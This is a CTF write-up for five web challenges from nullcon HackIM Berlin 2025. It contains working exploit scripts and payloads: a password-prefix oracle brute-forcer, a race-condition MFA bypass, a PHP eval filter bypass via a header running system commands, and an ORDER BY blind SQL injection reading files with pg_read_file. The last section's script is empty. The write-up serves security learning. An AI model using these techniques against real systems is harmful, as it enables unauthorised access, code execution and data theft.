## [nullcon](https://nullcon.net) HackIM CTF Berlin 2025 Writeup

## grandmas_notes

When a wrong password is entered, the service reveals the number of correct leading characters with this message:

`Invalid password, but you got X characters correct!`

This makes the login page vulnerable to incremental password enumeration so we can guess the password character-by-character and stop when the number of correct characters increases.

```python
import requests
from bs4 import BeautifulSoup

BASE = "http://52.59.124.14:5015/"
s = requests.Session()

def get_flash(html):
    soup = BeautifulSoup(html, "html.parser")
    box = soup.select_one(".flash")
    return box.get_text(strip=True) if box else ""

def try_prefix(user, prefix):
    r = s.post(BASE + "login.php", data={"username": user, "password": prefix}, allow_redirects=True)
    return get_flash(r.text)

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_{}-ABCDEFGHIJKLMNOPQRSTUVWXYZ"

user = "admin"
prefix = ""
last_correct = 0

while True:
    progressed = False
    for ch in alphabet:
        test = prefix + ch
        msg = try_prefix(user, test)
        if "got " in msg and "characters correct" in msg:
            N = int(msg.split("got ")[1].split(" ")[0])
            if N > last_correct:
                prefix = test
                last_correct = N
                print(f"[+] Found next char: {ch} → {prefix}")
                progressed = True
                break
    if not progressed:
        print(f"[!] Done. Password recovered: {prefix}")
        break

r = s.post(BASE + "login.php", data={"username": user, "password": prefix}, allow_redirects=True)
dash = s.get(BASE + "dashboard.php").text
print("[*] Dashboard page saved to dashboard.html")
open("dashboard.html","w",encoding="utf-8").write(dash)
```

Result:

```html
    <label>Your note</label>
    <textarea name="note">ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}</textarea>
    <br><button type="submit">Save</button>
```

## pwgen

We’re given this PHP code:

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$shuffle_count = abs(intval($_GET['nthpw']));

if($shuffle_count > 1000 or $shuffle_count < 1) {
    echo "Bad shuffle count! We won't have more than 1000 users anyway, but we can't tell you the master password!";
    echo "Take a look at /?source";
    die();
}

srand(0x1337); // the same user should always get the same password!

for($i = 0; $i < $shuffle_count; $i++) {
    $password = str_shuffle($FLAG);
}

if(isset($password)) {
    echo "Your password is: '$password'";
}
?>
```

Key observations: The FLAG is included from flag.php but never revealed directly, the script shuffles the flag using PHP’s built-in `str_shuffle()`. A fixed seed (srand(0x1337)) is used, making the shuffle fully deterministic. We control the parameter `nthpw`, deciding how many times the shuffle runs (up to 1000). The output is a shuffled flag. Since `str_shuffle()` is based on PHP’s PRNG (rand()), we can reverse the shuffle by reproducing the PRNG sequence.

The use of a constant seed (srand(0x1337)) makes the shuffle predictable. With the shuffled string and knowledge of nthpw, we can reproduce the random sequence used by str_shuffle then recover the permutation that shuffled the characters.

Solution:

```php
<?php
$S = "7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154";
$n = 1;
// Recreate the server's RNG state and the same shuffle permutation.
srand(0x1337);
$L = strlen($S);

for ($k = 1; $k < $n; $k++) {
    for ($i = $L - 1; $i > 0; $i--) {
        rand(0, $i);
    }
}

// Build the permutation used by str_shuffle for this nthpw
$idx = range(0, $L - 1);
for ($i = $L - 1; $i > 0; $i--) {
    $j = rand(0, $i);
    $tmp = $idx[$i];
    $idx[$i] = $idx[$j];
    $idx[$j] = $tmp;
}

// Invert the permutation to map shuffled chars back to original positions
$orig = array_fill(0, $L, '');
for ($i = 0; $i < $L; $i++) {
    $orig[$idx[$i]] = $S[$i];
}

echo implode($orig), PHP_EOL;
```

## webby

The challenge provides a web.py application implementing login, MFA, and flag retrieval. Key points from the source:

```python
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user, pw):
    users = {'user1': 'user1', ..., 'admin': 'admin'}
    return users[user] == pw

def check_mfa(user):
    return {'admin': True, ...}[user]
```

If login is admin, `check_mfa()` requires MFA. On login, `loggedIn=True`is set before MFA handling starts. Notice that`bcrypt.hashpw()` with `gensalt(14)` is slow, during this slow hash generation, the session temporarily has `loggedIn=True`.

```python
.
.
.
        else:
            session.loggedIn = True #vul here
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            session.loggedIn = False
            session._save()
.
.
.
```

Flag check logic as: if we hit /flag before loggedIn flips back to False, we bypass MFA. If we spam /flag during calling `bcrypt.hashpw()`, we can get the flag.

```python
if not session.get("loggedIn",False) or session.get("username") != "admin":
    redirect('/')
```

Solution:

```python
import threading, time, re
import requests

BASE = "http://52.59.124.14:5010"
s = requests.Session()
s.get(f"{BASE}/", timeout=5)
flag_html = None
stop = False

def spray_flag():
    global flag_html, stop
    while not stop:
        r = s.get(f"{BASE}/flag", allow_redirects=False, timeout=5)
        if r.status_code == 200:
            flag_html = r.text
            stop = True
            break

t = threading.Thread(target=spray_flag)
t.daemon = True
t.start()
s.post(f"{BASE}/", data={"username":"admin","password":"admin"}, allow_redirects=False, timeout=30)
t.join(timeout=5)
if flag_html:
    m = re.search(r'([A-Z]{2,}\{[^}]+\})', flag_html)
    print(m.group(1) if m else flag_html)
```

```
python3 s.py
ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}
```

## Slasher

We’re given a PHP snippet that takes user input, heavily escapes it, and `eval()` it:

```php
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
    $input = $_POST['input'];
    $input = htmlentities($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {}
}
```

Observations:

- The app applies multiple filters:
  htmlentities(), addslashes(), addcslashes().

- Characters like ;, numbers, quotes, etc. are escaped.

- The sanitized `$input` is directly passed to `eval("$input;")`.

We can bypass input filtering using PHP constants and built-in functions: `GETALLHEADERS()` returns an associative array of HTTP headers. Wrapping it in `MAX()` fetches the lexicographically highest header value. If we set a header whose value is valid PHP code, `MAX()` will return it. `EVAL(MAX(GETALLHEADERS()))` will execute that value.

We send a crafted POST request:

```bash
curl -sS -X POST 'http://52.59.124.14:5011/' \             
  -H 'Z: ~0;system("cat flag*");die;' \
  --data 'input=EVAL(MAX(GETALLHEADERS()))'
<?php

$FLAG = "ENO{3v4L_0nC3_Ag41n_F0r_Th3_W1n_:-)}";

?>
```

Explanation: `Z: ~0;system("id");die;` is the header containing PHP code. `~0` is a harmless expression ensuring syntax correctness. `system("id")` runs a shell command. `die;` stops execution, `input=EVAL(MAX(GETALLHEADERS()))` evaluates `MAX(GETALLHEADERS())` execute PHP commands.

## dogfinder

We’re targeting a dog listing web app. parameters: `?name=&breed=&min_age=&max_age=&page=&order=`. The order parameter is injectable, response shows dogs sorted by name or breed, allowing us to see boolean conditions.

The app likely executes:

```sql
SELECT ... FROM dogs ORDER BY <user-input>
```

We can inject a `CASE WHEN ... THEN name ELSE breed END` expression to influence ordering based on a boolean condition.
This turns the response into a binary oracle:

- If condition is true then first name stays the same.

- If false: order changes.

we use PostgreSQL’s  `pg_read_file()` to read files, use  `substr()` + `ascii()` to extract characters one at a time, wrap in a `CASE WHEN` to drive the sort order:

```sql
CASE WHEN (ascii(substr(trim(pg_read_file('flag.txt')),pos,1)) >= mid)
     THEN name ELSE breed END
```

```python

```
